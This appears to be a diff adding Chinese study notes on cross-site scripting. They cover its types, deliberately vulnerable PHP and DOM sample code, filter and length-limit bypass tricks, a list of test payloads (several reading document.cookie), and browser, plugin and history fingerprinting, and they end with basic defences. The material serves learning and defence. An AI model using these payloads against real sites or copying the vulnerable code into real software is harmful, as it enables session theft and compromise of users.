@@ -1,0 +1,199 @@
+XSS,Cross Site Scripting,跨站脚本攻击。利用网站对用户输入的过滤不足，在页面中注入客户端脚本（如HTML、JavaScript等），从而在用户浏览页面时，执行某些操作。最初这种攻击的演示案例是跨域的，虽然是否跨域已经不重要了，但是“跨站脚本攻击”的名字一直保留了下来。
+XSS攻击经常会嵌入一段远程或第三方域上的脚本，因为很多时候输入的长度是有限制的。嵌入的脚本与本域的脚本一样，在整个脚本上下文环境中存在，即可以访问当前脚本上下文的整个作用域中所有允许JavaScript访问的数据。
+XSS：利用一切办法将攻击的脚本在目标网站的目标用户的浏览器上执行。
+过程中可能会用到HTML、CSS、JS、document对象、window对象等，但是最终目的，都是想尽一切办法，执行JavaScript代码，最终起核心作用的都是JavaScript代码。
+（因为xss是几乎是在客户端完成运作的，客户端最广泛的是JS，所以XSS中的"脚本"一般就被认为是JS脚本，实际上也可以是其他任何语言的脚本，只要能够实现攻击目的）
+
+用户输入变量var，被填充入HTML中，在html中可能造成XSS的地方：
+1. 在html标签中
+2. 在html属性中
+3. <script>标签中
+4. 在事件中
+5. CSS中
+6. URL地址中
+可能会成为DOM Based XSS的输入点的地方：
+1. 页面中的所有input框
+2. windoe.location(href、hash等)
+3. window,name
+4. document.referrer
+5. localstorage
+6. XMLHttpRequest返回的数据
+7. 《web前端》page78
+
+
+XSS的分类：
+三种类型的XSS本质上只是插入攻击代码的位置不同。
+1. 反射型XSS（非持久型）
+这种XSS攻击只是将用户输入的未经安全过滤的内容直接在浏览器进行输出，导致输出数据中可能存在能被浏览器执行的代码。
+用户在浏览器输入数据，服务器未经安全过滤就将这段数据又输出到浏览器，故称为反射型，反射型XSS是一种非持久性XSS。可以将反射型XSS嵌入存储型XSS结合使用，使得反射型XSS也具有持久性。
+如，某个页面要求用户输入用户名，然后该页面自动输出一段"welcom ......"，代码如下：
+<?php
+$input=$_GET[“param”];
+echo “<div> welecom”.$input.”</div>”;
+?>
+（或：
+<input type="text" name="address" value="valuefrom">
+其中valuefrom来自用户输入）
+如果插入如下代码：
+http://www.a.com/test.php?param=<script>alert(/xss/)</script>
+就会发现"alert(/xss/)"被执行了。
+除了上面插入一个<script>标签外，还可以先将前一个标签闭合，再插入数据，然后将后面的结束标签注释掉或闭合掉。如下：
+</div><script>alert(/xss/)</script><div>
+或：
+"/><script>alert(document.cookie)</script><!-- 等
+HTML中的注释：
+<!--这是一段注释。-->
+<!--这是多行注释。
+abc
+def
+// -->
+"//"是JavaScript注释符号，可以避免"-->"被JavaScript执行。
+2.存储型XSS（持久型）
+存储型XSS是指，web应用程序会将用户输入存储在服务端。其他用户浏览这些数据时，会在服务端获取数据，这样所有浏览这个页面的用户的客户端换都会自动执行这段恶意代码。存储型XSS是持久性的XSS攻击，具有较强稳定性。
+存储型XSS一般发生在博客、文章评论中。将恶意代码写入文章或评论。
+3.Dom Based XSS
+DOM XSS和反射型XSS、存储型XSS的区别是：DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事。DOM XSS的代码执行的确是在客户端完成的，但是要想完成一次可利用的攻击，就要结合其他两种类型的XSS、结合其他攻击方法，攻击无边界。
+基于DOM的XSS，并不是按对否存储在服务端来分类的，在效果上来说它也是一种反射型XSS。
+通过修改页面中的DOM节点形成XSS攻击。要根据具体的JS Dom代码进行分析。即利用各种对Dom节点的操纵形成XSS。如document.cookie、
+document.getElementById("id").value、
+document.getElementById("id").innerHTML等。
+例：有如下页面代码：
+<html>
+<head>
+<title>DOM Based XSS Demo</title>
+<script>
+function xsstest()
+{
+ var str = document.getElementById("input").value;
+ document.getElementById("output").innerHTML = "<a href='"+str+"'>test</a>";
+}
+</script>
+</head>
+<body>
+<div id="output"></div>
+<input type="text" id="input" size=50 value="" />
+<input type="button" value="提交" onclick="xsstest()" />
+</body>
+</html>
+该页面要求输入一个图片地址，会生成一个该图片地址的链接，点击链接后跳转到图片页面。
+如果输入 'onclick=alert(/xss/) 或  'onclick=alert(/xss/)// 这样的可执行代码，就可能造成xss攻击。
+
+XSS技巧：
+1. 绕过长度限制/绕过特殊字符过滤：
+[附件:突破xss字符数量限制执行任意js代码.txt]
+很多时候，产生XSS的地方会有对变量的长度限制。
+最好的方法是将XSS代码写到别处，再通过简短的代码加载这段XSS代码。
+1).  利用"事件"缩短字节数：
+如利用onclick事件触发js函数或脚本：
+"onclick=alert(1)//  代替  "><script>alert(1)<script>
+2).  利用<base>标签
+<base>不常用，用来定义页面上所有使用“相对路径”标签的hosting地址。如：
+<body>
+<base href="http://www.gogle.com" />
+<img src="/abc/def/logo1.png" />
+<a href="abc.do">haha</a>
+</body>
+这样src和href属性中的相对url就会使用<base>标签中定义的地址作为hosting地址。
+3).  利用注释绕过长度限制：
+如果能控制两个文本框，可以利用HTML的注释符号，把两个文本框之间的html代码全部注释掉，从而连接两文本框中输入的内容。如：
+第一个输入框输入：
+"><!--
+第二个输入框输入：
+--><script>alert(/xss/);<script>
+4).  利用window对象绕过同源策略并且绕过XSS长度限制。window.name
+window对象是浏览器的窗体，不是document对象，所以很多时候window对象不受同源策略的限制。对当前窗口的window.name赋值，不受特殊字符限制。如：
+<scirpt>
+window.name="alert(document.cookie)";
+location.href="http://www.xss.com/xssed.php";
+</script>
+在同一窗口打开xss的站点后，只需要执行下面代码即可实施XSS攻击：
+eval(name);
+5).  利用某些字符编码造成歧义绕过过滤机制。
+有些字符的编码结合后，会形成歧义，变成另一个字符的编码，可以用这些特殊字符绕过对敏感字符的过滤。
+如，百度搜藏曾经出现过一个XSS漏洞，在一个接收输入的变量中，会转义双引号，如下：
+var redirectUrl="...";
+输入的数据中的双引号会被转义：  \"  。一般这样是不会出现XSS漏洞的， 但是百度的返回页面是GBK/GB2312编码的，这种编码方式中，"%c1"和"\"两个字符组合在一起"%c1\"会被当做一个Unicode字符，所以，构造如下输入：
+%c1";alert(/xss/);//
+提交后，结果为：
+var redirectUrl=" %c1\";alert(/xss/);// ";
+即，被分解成了两个语句：
+var redirectUrl=" %c1\";
+alert(/xss/);      // ";
+实现了XSS攻击。
+6).  利用location.hash隐藏代码。location.hash代表当前页面URL中的锚。location.hash的内容不会在Http协议包中发送。所以服务器端的web日志中不会留下location.hash里的内容，能更好的隐藏攻击意图。而且，location.hash没有长度限制，不过浏览器的地址栏是有长度限制的，但是这个长度足够写很长的代码了，如果长度不够，还可以通过加载远程js脚本解决。
+例：
+地址栏URL原为： abc.def.html   添加 #alert(1) 并回车（因为location.hash中的内容不会在http包中发送，所以页面并不会改变，只会改变url），URL变为：abc.def.html#alert(1) ，  在页面的输入框构造输入：
+' onclick=eval(location.hash.substr(1))//
+点击按钮后攻击成功（这里页面的html代码是上面Dom Based XSS中使用的代码）。
+因为location.hash的第一个字符是#，所以必须用substr(1)去除第一个字符才行。
+2. <title></title>标签中是无法执行脚本的，如果插入的内容会输出到这些标签内，应该使插入的脚本跳出这些标签，如下：
+</title><script>alert(1)</script>
+
+常用的XSS检测语句：
+[图片]
+
+[图片]
+《web前端黑客技术》中第六章，各种场景的xss挖掘，各种场景中xss挖掘时使用的语句。
+
+1.   <script>alert('xss')</script>
+2.   <ScrIpT>alert("xss")</SCriPt> //变换大小写
+3.   %3Cscript%3Ealert('XSS')%3C/script%3E
+4.   "/><script>alert(document.cookie)</script><!--
+5.   <script>alert(document.cookie)</script><!--
+6.   "onclick="alert(document.cookie)
+7.   <img src=javascript:alert("xss")></img
+8.   <img src=j&#97vascript:alert("xss")> //使用ASCII表示
+9.   <DIV  style="width:expression(alert(163));">  //其他属性
+10.   <embed src="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></embed>  //flash跨站 
+11.  通过XSS识别用户浏览器：
+1).  
+alert(navigator.userAgent);
+userAgent是可以伪造的，这种方法不一定准确。
+2).    通过浏览器之间的差异识别用户浏览器，利用这种差异分析几乎不会出错。
+通过如下代码；
+B=(function x(){})[-5]==’x’?’FF3′:(function x(){})[-6]==’x’?’FF2′:/a/[-1]==’a’?’FF’:’\v’==’v’?’IE’:/a/.__proto__==’//’?’Saf’:/s/. 
+test(/a/.toString)?’Chr’:/^function \(/.test[].sort)?’Op’:’Unknow’
+12.   识别用户安装的软件：
+1). 在IE中，可以通过判断ActiveX控件的classid是否存在，来推测用户是否安装了该软件。
+try {
+var Obj=new ActiveXObject(‘XunLeiBHO.ThunderIEHelper’);
+} catch (e){
+//异常了，不存在该控件
+}
+2). Firefox的插件(Plugins)列表存放在一个DOM对象中，通过查询DOM可以遍历出所有的插件:
+所以直接查询”navigator.plugins”对象，就能找到所有的插件了。例如 navigator.plugins[0]
+Firefox的扩展(extension)：通过检测扩展的图标，来判断某个特定的扩展是否存在。
+在firefox中有一个特殊的协议: chrome:// ，Chrome的扩展图标可以通过这个协议被访问到。比如Flash Got扩展的图标，可以这样访问:
+chrome://flashgot/skin/icon32.png
+扫描firefox扩展时，只需在Javascript中加载这张图片，如果加载成功，则扩展存在；反之，扩展就不存在。
+var m=new Image();
+m.onload=function(){
+alert(1);//图片存在
+};
+m.onerror=function(){
+alert(2);//图片不存在
+};
+m.src=”chrome://flashgot/skin/icon32.png”; //连接图片
+3).  利用第三方软件的漏洞。比如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息。 可以在Flash的ActionScript中读取system.capabilities对象后，将结果通过ExternalInterface传给页面的javascript。
+13.  通过XSS和CSS检测用户曾经访问过的网站：
+利用style的visited属性，如果用户曾经访问过某个链接，那么这个链接的颜色就会改变。
+<body>
+<a href=# >曾经访问过</a>
+<a href=”notexist”>未曾经访问过</a>
+</body>
+Firefox已经修补了这个漏洞。 
+14.  利用xss获取用户ip地址、本地网络信息等。JavaScript本身没有获取ip的能力，需要第三方软件来完成。比如，客户端安装了Java环境(JRE)，那么XSS就可以通过调用Java Applet的接口获取客户端的本地IP地址。
+
+
+
+XSS防范：
+目前，浏览器、ASP.net、服务器等都做了基本的XSS防范措施。
+1. 白名单处理。可以用到所有安全问题中。在安全问题中，白名单比黑名单更安全，可以对各种各样的期望做白名单处理，如只接收特定的数据类型、只接收来自指定url的跳转等。
+如在XSS等攻击中，可以对用户从输入做白名单，只接收期望的数据，其他的多虑掉。如只接收数字类型的数据等。
+2. 对JS，HTML标签、符号等进行过滤。（相当于黑名单）
+3. 对输入数据进行编码处理（HTMLencode）。
+4. 标记HttpOnly。将重要的cookie标记为HttpOnly。HttpOnly的作用是进制页面中的JavaScript访问带有HttpOnly标识的cookie。
+
+
+
+
